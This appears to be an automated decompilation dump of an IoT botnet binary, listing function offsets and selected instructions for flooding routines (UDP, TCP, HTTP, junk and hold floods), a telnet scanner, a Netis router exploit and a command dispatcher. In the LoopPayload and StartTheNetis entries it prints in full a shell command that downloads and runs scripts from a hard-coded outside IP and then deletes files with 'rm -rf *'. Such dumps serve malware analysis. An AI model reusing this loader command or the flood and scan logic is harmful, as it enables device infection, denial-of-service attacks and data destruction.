    return kill(__libc_getpid(), a1);
=================FUNCTION : __GI_setsockopt ===================
++++++++ FUNCTION START 41331
++++++++ FUNCTION END 41474
++++++++ FUNCTION LENGTH 143
    return __socketcall(14, (int32_t)&a1);
=================FUNCTION : rand ===================
++++++++ FUNCTION START 47666
++++++++ FUNCTION END 47810
++++++++ FUNCTION LENGTH 144
    return random();
=================FUNCTION : __bsd_signal ===================
++++++++ FUNCTION START 41932
++++++++ FUNCTION END 42123
++++++++ FUNCTION LENGTH 191
        while (true) {
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 67666
++++++++ FUNCTION END 67831
++++++++ FUNCTION LENGTH 165
    int32_t result = __GI_fgets_unlocked((char *)a1, a2, a3, v145); // 0x8056c4a
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 39435
++++++++ FUNCTION END 39579
++++++++ FUNCTION LENGTH 144
    return __GI_inet_ntoa_r(a1, (int32_t)&v141);
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 9930
++++++++ FUNCTION END 10079
++++++++ FUNCTION LENGTH 149
    rand_cmwc((int32_t)v143);
=================FUNCTION : __libc_sendto ===================
++++++++ FUNCTION START 41185
++++++++ FUNCTION END 41328
++++++++ FUNCTION LENGTH 143
    return __socketcall(11, (int32_t)&a1);
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 69481
++++++++ FUNCTION END 69704
++++++++ FUNCTION LENGTH 223
        while (true) {
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 32323
++++++++ FUNCTION END 32498
++++++++ FUNCTION LENGTH 175
    while (true) {
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 38031
++++++++ FUNCTION END 38175
++++++++ FUNCTION LENGTH 144
    return __GI_tcgetattr(a1, &v142) == 0;
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 68527
++++++++ FUNCTION END 68697
++++++++ FUNCTION LENGTH 170
    while (true) {
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 5069
++++++++ FUNCTION END 5240
++++++++ FUNCTION LENGTH 171
    while (true) {
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 73295
++++++++ FUNCTION END 73515
++++++++ FUNCTION LENGTH 220
    while (true) {
=================FUNCTION : __GI_snprintf ===================
++++++++ FUNCTION START 31002
++++++++ FUNCTION END 31147
++++++++ FUNCTION LENGTH 145
    return __GI_vsnprintf((char *)a1, a2, a3, (int32_t)&v142);
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 3900
++++++++ FUNCTION END 4045
++++++++ FUNCTION LENGTH 145
    return print(&v142, a1, (int32_t)&v143);
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 64618
++++++++ FUNCTION END 64762
++++++++ FUNCTION LENGTH 144
    return __read_etc_hosts_r(0, a1, a2, 0, (int32_t *)a3, a4, a5, a6, a7);
=================FUNCTION : __GI_strncat ===================
++++++++ FUNCTION START 68700
++++++++ FUNCTION END 68880
++++++++ FUNCTION LENGTH 180
        while (true) {
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 9779
++++++++ FUNCTION END 9927
++++++++ FUNCTION LENGTH 148
    free(v142);
=================FUNCTION : __length_dotted ===================
++++++++ FUNCTION START 73759
++++++++ FUNCTION END 73944
++++++++ FUNCTION LENGTH 185
    while (true) {
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 31150
++++++++ FUNCTION END 31295
++++++++ FUNCTION LENGTH 145
    return __GI_vsnprintf((char *)a1, -1, a2, (int32_t)&v142);
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 10538
++++++++ FUNCTION END 10695
++++++++ FUNCTION LENGTH 157
        result = __libc_recv(a1, a3, a4, 0);
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 36441
++++++++ FUNCTION END 36614
++++++++ FUNCTION LENGTH 173
    while (true) {
=================FUNCTION : __libc_recv ===================
++++++++ FUNCTION START 40893
++++++++ FUNCTION END 41036
++++++++ FUNCTION LENGTH 143
    return __socketcall(10, (int32_t)&a1);
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 36617
++++++++ FUNCTION END 36790
++++++++ FUNCTION LENGTH 173
    while (true) {
=================FUNCTION : __libc_fork ===================
++++++++ FUNCTION START 27689
++++++++ FUNCTION END 27845
++++++++ FUNCTION LENGTH 156
    int32_t v143 = fork(v142); // 0x8051575
=================FUNCTION : csum ===================
++++++++ FUNCTION START 9504
++++++++ FUNCTION END 9776
++++++++ FUNCTION LENGTH 272
        while (true) {
=================FUNCTION : __GI_clock_getres ===================
++++++++ FUNCTION START 54083
++++++++ FUNCTION END 54238
++++++++ FUNCTION LENGTH 155
    int32_t v142 = clock_getres(clk_id, res); // 0x8054e1b
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 39582
++++++++ FUNCTION END 39733
++++++++ FUNCTION LENGTH 151
    if (inet_aton((char *)a1, (int32_t)&result) != 0) {
=================FUNCTION : __libc_open ===================
++++++++ FUNCTION START 28796
++++++++ FUNCTION END 28956
++++++++ FUNCTION LENGTH 160
    int32_t fd = open(path, 0x1000000 * a2 / 0x1000000); // 0x80516df
=================FUNCTION : wait4 ===================
++++++++ FUNCTION START 55550
++++++++ FUNCTION END 55708
++++++++ FUNCTION LENGTH 158
    int32_t v146 = wait4(v142, v144, v143, v145); // 0x8054fd5
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 52208
++++++++ FUNCTION END 52366
++++++++ FUNCTION LENGTH 158
    if (__libc_open("/dev/null", v144) != v142) {
=================FUNCTION : __libc_creat ===================
++++++++ FUNCTION START 28959
++++++++ FUNCTION END 29103
++++++++ FUNCTION LENGTH 144
    return __libc_open((char *)a1, 577);
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 56178
++++++++ FUNCTION END 56421
++++++++ FUNCTION LENGTH 243
        while (true) {
=================FUNCTION : fprintf ===================
++++++++ FUNCTION START 56424
++++++++ FUNCTION END 56570
++++++++ FUNCTION LENGTH 146
    return __GI_vfprintf((int16_t *)a1, a2, (int32_t)&v143, v142);
=================FUNCTION : zprintf ===================
++++++++ FUNCTION START 3752
++++++++ FUNCTION END 3897
++++++++ FUNCTION LENGTH 145
    return print(NULL, a1, (int32_t)&v142);
=================FUNCTION : random ===================
++++++++ FUNCTION START 47813
++++++++ FUNCTION END 47964
++++++++ FUNCTION LENGTH 151
    __GI_random_r(&v143, (int32_t)&result);
=================FUNCTION : getsockopt ===================
++++++++ FUNCTION START 40747
++++++++ FUNCTION END 40890
++++++++ FUNCTION LENGTH 143
    return __socketcall(15, (int32_t)&a1);
=================FUNCTION : LoopPayload ===================
++++++++ FUNCTION START 12071
++++++++ FUNCTION END 12215
++++++++ FUNCTION LENGTH 144
    return __libc_system((int32_t)"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n");
=================FUNCTION : __libc_connect ===================
++++++++ FUNCTION START 40455
++++++++ FUNCTION END 40598
++++++++ FUNCTION LENGTH 143
    return __socketcall(3, (int32_t)&a1);
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 10082
++++++++ FUNCTION END 10234
++++++++ FUNCTION LENGTH 152
        __libc_close(a1);
=================FUNCTION : srand ===================
++++++++ FUNCTION START 48278
++++++++ FUNCTION END 48427
++++++++ FUNCTION LENGTH 149
    srandom_r((int64_t)a1, (int32_t)&v143);
=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 39264
++++++++ FUNCTION END 39432
++++++++ FUNCTION LENGTH 168
    while (true) {
=================FUNCTION : __libc_send ===================
++++++++ FUNCTION START 41039
++++++++ FUNCTION END 41182
++++++++ FUNCTION LENGTH 143
    return __socketcall(9, (int32_t)&a1);
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 39736
++++++++ FUNCTION END 39883
++++++++ FUNCTION LENGTH 147
    gethostbyname_r(a1, &v143, (int32_t)&v142, 460, (int32_t)&result, v140, v141, v141);
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 31298
++++++++ FUNCTION END 31468
++++++++ FUNCTION LENGTH 170
    int32_t result = _vfprintf_internal(v144, (char *)a3, a4, v142 + v148); // 0x8051a28
=================FUNCTION : __libc_close ===================
++++++++ FUNCTION START 27372
++++++++ FUNCTION END 27527
++++++++ FUNCTION LENGTH 155
    int32_t v142 = close(fd); // 0x8051518
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 33506
++++++++ FUNCTION END 33709
++++++++ FUNCTION LENGTH 203
        while (true) {
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 30245
++++++++ FUNCTION END 30389
++++++++ FUNCTION LENGTH 144
    return wait4(a1, a2, a3, 0);
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 36107
++++++++ FUNCTION END 36276
++++++++ FUNCTION LENGTH 169
    while (true) {
=================FUNCTION : HackerScan ===================
++++++++ FUNCTION START 9356
++++++++ FUNCTION END 9501
++++++++ FUNCTION LENGTH 145
    return rand_cmwc(v142) & -1 - a1 ^ v142;
=================FUNCTION : socket ===================
++++++++ FUNCTION START 41477
++++++++ FUNCTION END 41620
++++++++ FUNCTION LENGTH 143
    return __socketcall(1, (int32_t)&a1);
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 70153
++++++++ FUNCTION END 70375
++++++++ FUNCTION LENGTH 222
    while (true) {
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 4880
++++++++ FUNCTION END 5066
++++++++ FUNCTION LENGTH 186
    while (true) {
=================FUNCTION : __GI_getsockname ===================
++++++++ FUNCTION START 40601
++++++++ FUNCTION END 40744
++++++++ FUNCTION LENGTH 143
    return __socketcall(6, (int32_t)&a1);
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 65583
++++++++ FUNCTION END 65727
++++++++ FUNCTION LENGTH 144
    return _stdio_fopen(a1, (char *)a2, 0, -1);
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 2337 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 2393 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 2 @ prints ====================================
++++++++ WHILE START : 2753 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2767 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(v144, v143);
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 2912 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2926 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(v144, v143);
=============================WHILE LOOPS ID : 5 @ print ====================================
++++++++ WHILE START : 3453 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 3741 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)result, v150);
		while (true) {
		while (true) {
		int32_t v176 = prints(v174, NULL, (int32_t)&v175, (int32_t)&v175); // 0x8048798
		int32_t v178 = printi(v177) + result; // 0x8048769
		result2 = printi(v173) + result;
		result2 = printi(v172) + result;
		result2 = printi(v171) + result;
		int32_t v180 = prints((int32_t)v179, (char *)v161, v155, result) + result; // 0x8048685
=============================WHILE LOOPS ID : 6 @ fdpclose ====================================
++++++++ WHILE START : 4843 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 4867 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v149 = __libc_waitpid(v148, (int32_t)&v147, 0); // 0x8048ba6
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v146, 0);
=============================WHILE LOOPS ID : 9 @ getBogos ====================================
++++++++ WHILE START : 5919 
++++++++ WHILE FUNCTION : getBogos 
++++++++ WHILE END : 5977 
++++++++ INTRESTING INSTRUCTIONS :  
		uppercase((char *)&v143);
		if (strstr(v144, "BOGOMIPS") != v144) {
		if (fdgets(v144, 0x1000, v142) == 0) {
		while (true) {
		while (true) {
		__libc_close(v142);
=============================WHILE LOOPS ID : 10 @ recvLine ====================================
++++++++ WHILE START : 6483 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 6544 
++++++++ INTRESTING INSTRUCTIONS :  
		HackerPrint(v158, (int32_t)"PING");
		while (true) {
		if (__libc_recv(v158, (int32_t)&v161, 1, 0) != 1) {
=============================WHILE LOOPS ID : 13 @ listFork ====================================
++++++++ WHILE START : 7108 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 7125 
++++++++ INTRESTING INSTRUCTIONS :  
		free(v146);
=============================WHILE LOOPS ID : 14 @ matchPrompt ====================================
++++++++ WHILE START : 7481 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 7533 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 15 @ readUntil ====================================
++++++++ WHILE START : 7683 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 7771 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v148 = __libc_recv(a1, v147, 1, 0); // 0x804990d
		int32_t v151 = __libc_recv(a1, v147 + 1, 2, 0); // 0x804994e
		if (strstr(v143, (char *)a2) == 0) {
=============================WHILE LOOPS ID : 17 @ contains_string ====================================
++++++++ WHILE START : 11152 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 11168 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v145) == 0) {
=============================WHILE LOOPS ID : 18 @ StartTheLelz ====================================
++++++++ WHILE START : 11333 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 11906 
++++++++ INTRESTING INSTRUCTIONS :  
		case 0: {
		socket(0x10000 * v164 / 0x10000, v165, v163);
		if (__libc_connect(v165, v163, 0) == -1) {
		sclose(v165);
		socket(0x10000 * v164 / 0x10000, v165, v163);
		case 1: {
		sclose(v161);
		sclose(v176);
		getsockopt(v161, v177, v174, 10, v170);
		sclose(v161);
		case 2: {
		case 3: {
		if (__libc_send(v178, v146, v157, v143) >= 0) {
		if (__libc_send(v178, v146, v157, v143) >= 0) {
		case 4: {
		case 5: {
		if (__libc_send(v179, v149, v146, v157) >= 0) {
		if (__libc_send(v179, v149, v146, v157) >= 0) {
		case 6: {
		get_telstate_host();
		HackerPrint(v151, v149);
		get_telstate_host();
		HackerPrint(v151, v149);
		case 7: {
		if (__libc_send(v182, v151, v149, v146) >= 0) {
		sclose(v182);
		while (true) {
=============================WHILE LOOPS ID : 19 @ StartTheNetis ====================================
++++++++ WHILE START : 12058 
++++++++ WHILE FUNCTION : StartTheNetis 
++++++++ WHILE END : 12067 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v146 = socket(2, 2, 0); // 0x804db03
		NetisRanges(v146);
		sprintf(v145, (int32_t)"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00");
		__libc_sendto(v146, v145, v147, 0, v143, 16);
=============================WHILE LOOPS ID : 20 @ sendHTTP ====================================
++++++++ WHILE START : 12884 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 12922 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_fork(v146) != 0) {
		while (true) {
		int32_t v147 = socket_connect(a1, a3); // 0x804dfeb
		__libc_close(v147);
=============================WHILE LOOPS ID : 21 @ sendSTD ====================================
++++++++ WHILE START : 13086 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 13112 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		__libc_send(v142, v152, 75, 0);
		__libc_connect(v142, v145, 16);
		__libc_close(v142);
=============================WHILE LOOPS ID : 22 @ sendUDP ====================================
++++++++ WHILE START : 13293 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 13318 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v146, v148, a5, 0, (int32_t)&v143, 16);
		rand_cmwc(v146);
=============================WHILE LOOPS ID : 23 @ sendUDP ====================================
++++++++ WHILE START : 13399 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 13440 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v167, (int32_t)&v168, (int32_t)&v168, (int32_t)&v168, (int32_t)&v168, (int32_t)&v168);
		*v159 = (int16_t)(0x10000 * rand_cmwc(v167) / 0x10000);
		v169 = rand_cmwc(v167);
		*(int16_t *)(v157 | 4) = (int16_t)(0x10000 * rand_cmwc(v172) / 0x10000);
=============================WHILE LOOPS ID : 24 @ sendTCP ====================================
++++++++ WHILE START : 13842 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13977 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v182 = ((int32_t)(v180 | _strncmp(v167, "rst", 4) % 2 == 0) | v181) ^ 1; // 0x804e989
		int32_t v192 = ((int32_t)(v190 | _strncmp(v167, "psh", 4) % 2 == 0) | v191) ^ 1; // 0x804ea7c
		HackerPrint(4, (int32_t)"psh");
		v176 = "psh";
		v176 = "psh";
=============================WHILE LOOPS ID : 25 @ sendTCP ====================================
++++++++ WHILE START : 14001 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 14030 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v159, v148, v143, v144, v145, 0);
		*(int16_t *)(v149 | 4) = (int16_t)(0x10000 * rand_cmwc(v159) / 0x10000);
		*v153 = rand_cmwc(v159);
		*v151 = (int16_t)(0x10000 * rand_cmwc(v159) / 0x10000);
		*v163 = (int16_t)tcpcsum();
=============================WHILE LOOPS ID : 26 @ sendTCP ====================================
++++++++ WHILE START : 14069 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 14084 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v159, v148, v143, v144, v145, 0);
		*(int16_t *)(v149 | 4) = (int16_t)(0x10000 * rand_cmwc(v159) / 0x10000);
		*v153 = rand_cmwc(v159);
		*v151 = (int16_t)(0x10000 * rand_cmwc(v159) / 0x10000);
		*v163 = (int16_t)tcpcsum();
=============================WHILE LOOPS ID : 28 @ sendJUNK ====================================
++++++++ WHILE START : 14277 
++++++++ WHILE FUNCTION : sendJUNK 
++++++++ WHILE END : 14403 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(v171);
		getsockopt(v165, v164, 0x2710, v163, (int32_t)&v170);
		__libc_close(v165);
		makeRandomStr((char *)v162, v143);
		if (__libc_send(v165, v164, v154, v163) != -1) {
		__libc_close(v165);
		socket(v162, v143, v166);
		if (__libc_connect(v162, v143, v166) != -1) {
		__libc_close(v162);
=============================WHILE LOOPS ID : 30 @ sendHOLD ====================================
++++++++ WHILE START : 14593 
++++++++ WHILE FUNCTION : sendHOLD 
++++++++ WHILE END : 14701 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(v166);
		getsockopt(v168, v165, 0x2710, v161, (int32_t)&v162);
		__libc_close(v168);
		__libc_close(v172);
		socket(v159, v143, (int32_t)&v162);
		if (__libc_connect(v159, v143, (int32_t)&v162) != -1) {
		__libc_close(v159);
=============================WHILE LOOPS ID : 31 @ processCmd ====================================
++++++++ WHILE START : 15129 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15175 
++++++++ INTRESTING INSTRUCTIONS :  
		if (*v307 != __libc_getpid()) {
		kill(v309, 9);
=============================WHILE LOOPS ID : 32 @ processCmd ====================================
++++++++ WHILE START : 15263 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15279 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v310, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 36 @ processCmd ====================================
++++++++ WHILE START : 15505 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15514 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 38 @ processCmd ====================================
++++++++ WHILE START : 15569 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15585 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v312, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 40 @ processCmd ====================================
++++++++ WHILE START : 15697 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15706 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 42 @ processCmd ====================================
++++++++ WHILE START : 15797 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15816 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 44 @ processCmd ====================================
++++++++ WHILE START : 15934 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15943 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 46 @ processCmd ====================================
++++++++ WHILE START : 16017 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16026 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 48 @ processCmd ====================================
++++++++ WHILE START : 16139 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16148 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 51 @ processCmd ====================================
++++++++ WHILE START : 16325 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16334 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 53 @ processCmd ====================================
++++++++ WHILE START : 16397 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16406 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 55 @ processCmd ====================================
++++++++ WHILE START : 16510 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16519 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 57 @ processCmd ====================================
++++++++ WHILE START : 16597 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16614 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendCNC(v315, v236, v237);
		__libc_close(v142);
=============================WHILE LOOPS ID : 59 @ processCmd ====================================
++++++++ WHILE START : 16742 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16751 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 61 @ processCmd ====================================
++++++++ WHILE START : 16823 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16832 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 63 @ processCmd ====================================
++++++++ WHILE START : 16948 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16957 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 65 @ processCmd ====================================
++++++++ WHILE START : 17039 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17051 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 67 @ processCmd ====================================
++++++++ WHILE START : 17173 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17182 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 69 @ processCmd ====================================
++++++++ WHILE START : 17254 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17263 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 71 @ processCmd ====================================
++++++++ WHILE START : 17379 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17388 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 74 @ processCmd ====================================
++++++++ WHILE START : 17558 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17567 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 76 @ processCmd ====================================
++++++++ WHILE START : 17622 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17631 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 17707 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17716 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 78 @ processCmd ====================================
++++++++ WHILE START : 17762 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17774 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v249, v250);
		sendSTD(v242, (int16_t)v249, v250);
		sendHOLD(v242, v249, v250);
		__libc_close(v142);
=============================WHILE LOOPS ID : 79 @ processCmd ====================================
++++++++ WHILE START : 17856 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17865 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 17901 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17910 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, (int16_t)v260, v261);
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 17986 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17995 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 18048 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18066 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 18172 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18181 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 18224 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18233 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
